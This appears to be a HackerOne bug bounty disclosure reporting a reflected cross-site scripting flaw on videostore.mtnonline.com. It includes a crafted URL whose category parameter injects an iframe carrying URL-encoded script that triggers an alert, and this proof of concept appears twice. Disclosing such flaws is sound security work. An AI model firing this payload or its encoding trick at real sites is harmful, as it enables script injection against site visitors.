# Reflected xss on videostore.mtnonline.com

## Metadata
- **Source:** HackerOne
- **Report:** 1646248 | https://hackerone.com/reports/1646248
- **Submitted:** 2022-07-22
- **Reporter:** possowski
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
Hi,
I found reflected xss vuln on videostore.mtnonline.com

## Steps To Reproduce:
  1. Open browser
  2. Go to ``https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E`` url
 3. Browser show alert po

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Hi,
I found reflected xss vuln on videostore.mtnonline.com

## Steps To Reproduce:
  1. Open browser
  2. Go to ``https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E`` url
 3. Browser show alert popup

## Impact

We can run javascript code

</details>

---
*Analysed by Claude on 2026-05-24*
